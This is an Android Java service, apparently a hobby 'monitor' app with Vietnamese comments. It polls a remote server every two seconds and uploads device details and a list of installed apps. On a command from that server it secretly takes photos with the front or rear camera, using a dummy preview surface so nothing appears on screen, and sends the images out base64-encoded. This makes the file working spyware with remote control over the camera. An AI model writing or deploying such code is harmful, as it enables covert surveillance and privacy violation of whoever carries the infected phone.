package com.devtung.monitor;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StatFs;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONArray;
import org.json.JSONObject;

public class MonitorService extends Service {
    private Timer timer = new Timer();
    private final String SERVER_URL = "http://devtung.pythonanywhere.com/update-status";
    private String encodedCamData = null;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("monitor", "Monitor ngầm", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            Notification notification = new Notification.Builder(this, "monitor")
                .setContentTitle("Devtung System Online")
                .setContentText("Đang đồng bộ phần cứng thực tế...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                sendData();
            }
        }, 0, 2000); 
        return START_STICKY;
    }

    // 1. Đo thông số RAM thật của máy
    private JSONObject getRealRAM() {
        JSONObject ram = new JSONObject();
        try {
            ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
            ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            activityManager.getMemoryInfo(mi);
            
            double total = mi.totalMem / (1024.0 * 1024.0 * 1024.0);
            double avail = mi.availMem / (1024.0 * 1024.0 * 1024.0);
            double used = total - avail;
            int percent = (int) ((used / total) * 100);

            ram.put("percentage", percent + "%");
            ram.put("used", String.format("%.2f GB", used));
            ram.put("total", String.format("%.2f GB", total));
        } catch (Exception e) { e.printStackTrace(); }
        return ram;
    }

    // 2. Đo dung lượng bộ nhớ trong (Ổ đĩa) thật
    private JSONArray getRealStorage() {
        JSONArray disks = new JSONArray();
        try {
            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            long blockSize = stat.getBlockSizeLong();
            long totalBlocks = stat.getBlockCountLong();
            long availableBlocks = stat.getAvailableBlocksLong();

            double total = (totalBlocks * blockSize) / (1024.0 * 1024.0 * 1024.0);
            double free = (availableBlocks * blockSize) / (1024.0 * 1024.0 * 1024.0);
            int percent = (int) (((total - free) / total) * 100);

            JSONObject disk = new JSONObject();
            disk.put("device", "Bộ nhớ trong");
            disk.put("percentage", "Đầy " + percent + "%");
            disk.put("free", String.format("%.1f GB trống", free));
            disks.put(disk);
        } catch (Exception e) { e.printStackTrace(); }
        return disks;
    }

    // 3. Quét danh sách các App đã cài trên máy
    private JSONArray getInstalledApps() {
        JSONArray apps = new JSONArray();
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            int count = 0;
            for (ApplicationInfo packageInfo : packages) {
                // Lọc lấy app người dùng cài (Không lấy app hệ thống core ẩn)
                if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    apps.put(packageInfo.loadLabel(pm).toString());
                    count++;
                    if (count >= 30) break; // Giới hạn 30 app đầu tiên tránh tràn RAM truyền tải
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
        if (apps.length() == 0) apps.put("Devtung Monitor");
        return apps;
    }

    // 4. Hàm Chụp Ảnh Camera ngầm không cần mở màn hình giao diện
    private void captureHardwareCamera(int camId) {
        try {
            final Camera camera = Camera.open(camId);
            SurfaceTexture dummy = new SurfaceTexture(0);
            camera.setPreviewTexture(dummy);
            camera.startPreview();
            
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    encodedCamData = "data:image/jpeg;base64," + Base64.encodeToString(data, Base64.DEFAULT).replace("\n", "");
                    camera.release();
                }
            });
        } catch (Exception e) {
            encodedCamData = "ERROR: Camera đang bị app khác chiếm dụng!";
        }
    }

    private void sendData() {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("computer_name", (Build.BRAND + "_" + Build.MODEL).toUpperCase().replace(" ", "_"));
            json.put("os", "Android " + Build.VERSION.RELEASE);
            json.put("architecture", Build.CPU_ABI);
            json.put("uptime", "Hệ thống App chạy ổn định");
            
            // Đổ dữ liệu đo đạc thật vào JSON
            json.put("ram", getRealRAM());
            json.put("disks", getRealStorage());
            json.put("installed_apps_list", getInstalledApps());
            json.put("cpu", new JSONObject().put("current_usage", "Đang chạy ngầm"));

            // Nếu có dữ liệu camera vừa chụp từ vòng lặp lệnh, đính kèm gửi lên Web liền
            if (encodedCamData != null) {
                json.put("cam_result", encodedCamData);
                encodedCamData = null; // Gửi xong xóa bộ nhớ đệm
            }

            String jsonInputString = json.toString();
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            // Đọc phản hồi lệnh điều khiển từ xa của Web trả về
            if (conn.getResponseCode() == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }
                
                JSONObject resJson = new JSONObject(response.toString());
                
                // Bắt lệnh bấm nút Camera từ xa trên Web
                if (resJson.has("trigger_cam_index")) {
                    int camIdx = resJson.getInt("trigger_cam_index");
                    // Chuyển đổi ID phù hợp phần cứng Android (0: Sau, 1: Trước)
                    captureHardwareCamera(camIdx <= 0 ? 0 : 1);
                }
            }
            conn.disconnect();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
